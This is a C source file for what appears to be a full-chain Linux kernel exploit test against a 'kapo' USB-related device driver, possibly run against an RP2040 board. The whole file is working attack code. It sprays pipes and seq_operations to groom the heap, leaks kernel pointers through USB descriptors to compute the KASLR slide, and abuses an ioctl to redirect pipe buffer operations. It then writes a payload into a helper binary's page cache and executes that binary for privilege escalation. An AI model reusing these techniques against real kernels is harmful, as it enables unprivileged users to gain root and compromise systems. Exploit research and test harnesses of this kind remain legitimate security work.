// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define KAPO_FETCH_RECORDS _IOW('K', 1, struct kapo_transfer_context)
#define KAPO_NEXT_STAGE _IO('K', 2)
#define PIPE_COUNT 768
#define HELPER_GROOM_PIPE_COUNT 400
#define SEQ_GROOM_COUNT 256
#define PAGE_SIZE 4096
#define DEVICE_DESCRIPTOR_SIZE 18
#define SEQ_CONFIG_LENGTH 32
#define PIPE_CONFIG_LENGTH 1024
#define HELPER_CONFIG_COUNT 8
#define SEQ_LEAK_OFFSET 0x19
#define HELPER_PAGE_LEAK_OFFSET 0x50
#define TARGET_STRUCT_PAGE_SIZE 64
#define KERNEL_IMAGE_BASE 0xffffffff80000000ULL
#define VMEMMAP_BASE_ALIGNMENT 0x40000000ULL
#define TARGET_VMEMMAP_SPAN 0x02000000ULL
#define KERNEL_IMAGE_SIZE 0x40000000ULL
#define KASLR_ALIGNMENT 0x200000ULL

struct kapo_transfer_context {
	uint64_t page;
	uint64_t ops;
	uint32_t offset;
	uint32_t reserved;
};

extern const unsigned char kapo_payload_start[];
extern const unsigned char kapo_payload_end[];

static void fail(const char *operation)
{
	perror(operation);
	exit(EXIT_FAILURE);
}

static uint64_t parse_u64(const char *text, const char *name)
{
	char *end;
	uint64_t value;

	errno = 0;
	value = strtoull(text, &end, 0);
	if (errno || !*text || *end) {
		fprintf(stderr, "invalid %s: %s\n", name, text);
		exit(EXIT_FAILURE);
	}
	return value;
}

static off_t descriptor_size(const char *path)
{
	char buffer[2048];
	off_t total = 0;
	ssize_t length;
	int fd = open(path, O_RDONLY);

	if (fd < 0)
		return -1;
	while ((length = read(fd, buffer, sizeof(buffer))) > 0)
		total += length;
	if (length < 0)
		fail("measure descriptors");
	if (close(fd))
		fail("close descriptors");
	return total;
}

static void wait_for_descriptor(const char *path, off_t size, int present)
{
	int i;

	for (i = 0; i < 300; i++) {
		off_t observed = descriptor_size(path);

		if (present ? observed == size : observed < 0)
			return;
		usleep(100000);
	}
	fprintf(stderr, "timed out waiting for %s descriptor: %s\n",
		present ? "matching" : "removed", path);
	exit(EXIT_FAILURE);
}

static void read_exact(const char *path, void *buffer, size_t length, off_t offset)
{
	int fd = open(path, O_RDONLY);

	if (fd < 0)
		fail(path);
	if (pread(fd, buffer, length, offset) != (ssize_t)length)
		fail("read descriptor leak");
	if (close(fd))
		fail("close descriptors");
}

static uint64_t read_pointer_leak(const char *path, off_t offset)
{
	uint64_t value;

	read_exact(path, &value, sizeof(value), offset);
	return le64toh(value);
}

static int is_vmemmap_candidate(uint64_t value)
{
	return (value >> 57) == 0x7f && value < KERNEL_IMAGE_BASE &&
	       !(value & (TARGET_STRUCT_PAGE_SIZE - 1)) &&
	       (value & (VMEMMAP_BASE_ALIGNMENT - 1)) < TARGET_VMEMMAP_SPAN;
}

static uint64_t find_helper_page(const char *path)
{
	uint64_t candidates[HELPER_CONFIG_COUNT];
	int config, other;

	for (config = 0; config < HELPER_CONFIG_COUNT; config++)
		candidates[config] = read_pointer_leak(path, DEVICE_DESCRIPTOR_SIZE +
						       config * PIPE_CONFIG_LENGTH +
						       HELPER_PAGE_LEAK_OFFSET);
	for (config = 0; config < HELPER_CONFIG_COUNT; config++) {
		int matches = 0;

		if (!is_vmemmap_candidate(candidates[config]))
			continue;
		for (other = 0; other < HELPER_CONFIG_COUNT; other++)
			matches += candidates[other] == candidates[config];
		if (matches >= 2)
			return candidates[config];
	}
	return 0;
}

static uint64_t read_proc_leak(const char *path, off_t offset,
			       uint64_t proc_static)
{
	uint8_t bytes[8] = { proc_static & 0xff };
	uint64_t value;

	read_exact(path, bytes + 1, sizeof(bytes) - 1, offset);
	memcpy(&value, bytes, sizeof(value));
	return le64toh(value);
}

static void print_pointer_candidates(const char *path)
{
	uint8_t descriptors[DEVICE_DESCRIPTOR_SIZE + PIPE_CONFIG_LENGTH];
	size_t offset;

	read_exact(path, descriptors, sizeof(descriptors), 0);
	for (offset = DEVICE_DESCRIPTOR_SIZE; offset < DEVICE_DESCRIPTOR_SIZE + 128;
	     offset++) {
		if (!((offset - DEVICE_DESCRIPTOR_SIZE) % 16))
			printf("CONFIG[%04zx] ", offset - DEVICE_DESCRIPTOR_SIZE);
		printf("%02x%c", descriptors[offset],
		       (offset - DEVICE_DESCRIPTOR_SIZE) % 16 == 15 ? '\n' : ' ');
	}
	for (offset = DEVICE_DESCRIPTOR_SIZE + 25;
	     offset + sizeof(uint64_t) <= sizeof(descriptors); offset++) {
		uint64_t value;

		memcpy(&value, descriptors + offset, sizeof(value));
		value = le64toh(value);
		if ((value >> 48) == 0xffff)
			printf("POINTER_CANDIDATE config_offset=%#zx value=%#llx\n",
				offset - DEVICE_DESCRIPTOR_SIZE,
				(unsigned long long)value);
	}
}

static void signal_ready(const char *stage)
{
	static const char path[] = "/tmp/kapo-usb-ready";
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		fail("open readiness signal");
	if (dprintf(fd, "%s\n", stage) < 0)
		fail("write readiness signal");
	if (close(fd))
		fail("close readiness signal");
}

static int open_device(const char *path);

static void advance_firmware(const char *device)
{
	int fd = open_device(device);

	if (ioctl(fd, KAPO_NEXT_STAGE) < 0)
		fail("KAPO_NEXT_STAGE");
	if (close(fd))
		fail("close stage device");
}

static void groom_helper_page_buffers(const char *helper)
{
	static int pipes[HELPER_GROOM_PIPE_COUNT][2];
	char page[PAGE_SIZE] = { 0 };
	int source = open(helper, O_RDONLY);
	int index;

	if (source < 0)
		fail(helper);
	for (index = 0; index < HELPER_GROOM_PIPE_COUNT; index++) {
		loff_t offset = PAGE_SIZE;

		if (pipe(pipes[index]) ||
		    write(pipes[index][1], page, sizeof(page)) != sizeof(page) ||
		    write(pipes[index][1], page, sizeof(page)) != sizeof(page) ||
		    splice(source, &offset, pipes[index][1], NULL, 1, 0) != 1)
			fail("helper pipe grooming");
	}
	for (index = 1; index < HELPER_GROOM_PIPE_COUNT; index += 2) {
		close(pipes[index][0]);
		close(pipes[index][1]);
	}
	if (close(source))
		fail("close helper source");
}

static void groom_seq_operations(void)
{
	int files[SEQ_GROOM_COUNT];
	int index;

	for (index = 0; index < SEQ_GROOM_COUNT; index++) {
		files[index] = open("/proc/self/stat", O_RDONLY);
		if (files[index] < 0)
			fail("seq_operations grooming");
	}
	for (index = 0; index < SEQ_GROOM_COUNT; index++)
		close(files[index]);
}

static int open_device(const char *path)
{
	int fd;
	int i;

	for (i = 0; i < 300; i++) {
		fd = open(path, O_RDONLY);
		if (fd >= 0)
			return fd;
		usleep(100000);
	}
	fail(path);
	return -1;
}

static void prepare_pipe_target(int pipes[PIPE_COUNT][2], const char *helper,
				off_t patch_offset)
{
	char page[PAGE_SIZE] = { 0 };
	loff_t splice_offset = patch_offset - 1;
	int source;
	int i;

	source = open(helper, O_RDONLY);
	if (source < 0)
		fail(helper);
	for (i = 0; i < PIPE_COUNT; i++) {
		if (pipe(pipes[i]))
			fail("pipe target spray");
		if (i == PIPE_COUNT - 1) {
			if (splice(source, &splice_offset, pipes[i][1], NULL, 1, 0) != 1)
				fail("splice helper target");
		} else if (write(pipes[i][1], page, sizeof(page)) != sizeof(page)) {
			fail("fill pipe target spray");
		}
	}
	if (close(source))
		fail("close helper source");
	if (close(pipes[PIPE_COUNT - 2][0]) || close(pipes[PIPE_COUNT - 2][1]))
		fail("free pipe target slot");
}

static void execute_helper(const char *helper)
{
	pid_t child = fork();
	int status;

	if (child < 0)
		fail("fork helper");
	if (!child) {
		char *const arguments[] = { (char *)helper, NULL };
		char *const environment[] = { NULL };

		execve(helper, arguments, environment);
		fail("exec helper");
	}
	if (waitpid(child, &status, 0) != child)
		fail("wait helper");
	if (!WIFEXITED(status) || WEXITSTATUS(status)) {
		fprintf(stderr, "helper did not exit successfully\n");
		exit(EXIT_FAILURE);
	}
}

static void verify_helper_patch(const char *helper, off_t patch_offset)
{
	size_t payload_size = kapo_payload_end - kapo_payload_start;
	unsigned char observed[256];

	if (payload_size > sizeof(observed)) {
		fprintf(stderr, "helper payload is too large\n");
		exit(EXIT_FAILURE);
	}
	read_exact(helper, observed, payload_size, patch_offset);
	if (memcmp(observed, kapo_payload_start, payload_size)) {
		fprintf(stderr, "helper page-cache patch did not land\n");
		exit(EXIT_FAILURE);
	}
	puts("PAGE_CACHE_WRITE_PASS");
}

int main(int argc, char **argv)
{
	struct kapo_transfer_context context;
	const char *descriptors;
	const char *device;
	const char *helper;
	uint64_t proc_static, ops_static, proc_runtime, seq_leak;
	uint64_t slide;
	uint64_t patch_offset;
	size_t payload_size = kapo_payload_end - kapo_payload_start;
	struct rlimit limit;
	int pipes[PIPE_COUNT][2];
	int device_fd;
	int result;
	int hardware_mode = 0;

	if (argc == 8 && !strcmp(argv[1], "--hardware")) {
		hardware_mode = 1;
		argc--;
		argv++;
	}
	if (argc != 7) {
		fprintf(stderr,
			"usage: %s [--hardware] <descriptors> <device> <helper> <proc_static> <ops_static> <patch_offset>\n",
			argv[0]);
		return EXIT_FAILURE;
	}
	if (getrlimit(RLIMIT_NOFILE, &limit))
		fail("read file descriptor limit");
	if (limit.rlim_max < PIPE_COUNT * 2 + 4) {
		fprintf(stderr, "file descriptor hard limit is too low\n");
		return EXIT_FAILURE;
	}
	limit.rlim_cur = limit.rlim_max < 4096 ? limit.rlim_max : 4096;
	if (setrlimit(RLIMIT_NOFILE, &limit))
		fail("raise file descriptor limit");
	if (!geteuid()) {
		if (setgid(65534) || setuid(65534))
			fail("drop privileges");
	}
	if (!geteuid()) {
		fprintf(stderr, "full-chain test must run unprivileged\n");
		return EXIT_FAILURE;
	}
	descriptors = argv[1];
	device = argv[2];
	helper = argv[3];
	proc_static = parse_u64(argv[4], "proc_single_show");
	ops_static = parse_u64(argv[5], "page_cache_pipe_buf_ops");
	patch_offset = parse_u64(argv[6], "patch offset");
	if (!proc_static || !ops_static || !(patch_offset & (PAGE_SIZE - 1)) ||
	    (patch_offset & (PAGE_SIZE - 1)) + payload_size > PAGE_SIZE) {
		fprintf(stderr, "invalid symbols, patch offset, or payload size\n");
		return EXIT_FAILURE;
	}

	printf("EUID_BEFORE=%u\n", geteuid());
	if (hardware_mode) {
		if (descriptor_size(descriptors) >= 0) {
			fprintf(stderr, "disconnect or reset RP2040 before starting hardware mode\n");
			return EXIT_FAILURE;
		}
	}
	groom_helper_page_buffers(helper);
	if (!hardware_mode)
		signal_ready("helper");
	wait_for_descriptor(descriptors,
			    DEVICE_DESCRIPTOR_SIZE +
			    HELPER_CONFIG_COUNT * PIPE_CONFIG_LENGTH, 1);
	context.page = find_helper_page(descriptors);
	printf("HELPER_PAGE=%#llx\n", (unsigned long long)context.page);
	if (!is_vmemmap_candidate(context.page)) {
		print_pointer_candidates(descriptors);
		fprintf(stderr, "invalid helper page candidate\n");
		return EXIT_FAILURE;
	}
	advance_firmware(device);
	wait_for_descriptor(descriptors, 0, 0);
	groom_seq_operations();
	if (!hardware_mode)
		signal_ready("seq");
	wait_for_descriptor(descriptors,
			    DEVICE_DESCRIPTOR_SIZE + SEQ_CONFIG_LENGTH, 1);
	seq_leak = read_proc_leak(descriptors,
				  DEVICE_DESCRIPTOR_SIZE + SEQ_LEAK_OFFSET,
				  proc_static);
	proc_runtime = seq_leak;
	if ((proc_runtime >> 32) != 0xffffffff || proc_runtime < proc_static) {
		fprintf(stderr, "invalid proc_single_show leak: %#llx\n",
			(unsigned long long)seq_leak);
		return EXIT_FAILURE;
	}
	slide = proc_runtime - proc_static;
	if (slide >= KERNEL_IMAGE_SIZE || (slide & (KASLR_ALIGNMENT - 1))) {
		fprintf(stderr, "invalid KASLR slide: %#llx\n",
			(unsigned long long)slide);
		return EXIT_FAILURE;
	}
	printf("KASLR_SLIDE=%#llx\n", (unsigned long long)slide);
	advance_firmware(device);
	wait_for_descriptor(descriptors, 0, 0);
	if (!hardware_mode)
		signal_ready("stage2");
	wait_for_descriptor(descriptors,
			    DEVICE_DESCRIPTOR_SIZE + PIPE_CONFIG_LENGTH, 1);

	context.ops = ops_static + slide;
	context.offset = (patch_offset & (PAGE_SIZE - 1)) - 1;
	context.reserved = 0;
	printf("OPS=%#llx\n", (unsigned long long)context.ops);
	if ((context.ops >> 56) != 0xff) {
		fprintf(stderr, "invalid Stage 1 context\n");
		return EXIT_FAILURE;
	}
	prepare_pipe_target(pipes, helper, patch_offset);
	device_fd = open_device(device);
	result = ioctl(device_fd, KAPO_FETCH_RECORDS, &context);
	if (result != 2048) {
		if (result < 0)
			perror("KAPO_FETCH_RECORDS");
		else
			fprintf(stderr, "KAPO_FETCH_RECORDS returned %d\n", result);
		return EXIT_FAILURE;
	}
	if (write(pipes[PIPE_COUNT - 1][1], kapo_payload_start, payload_size) !=
	    (ssize_t)payload_size)
		fail("write helper payload");
	verify_helper_patch(helper, patch_offset);
	execute_helper(helper);
	puts("FULL_CHAIN_PASS");
	return EXIT_SUCCESS;
}
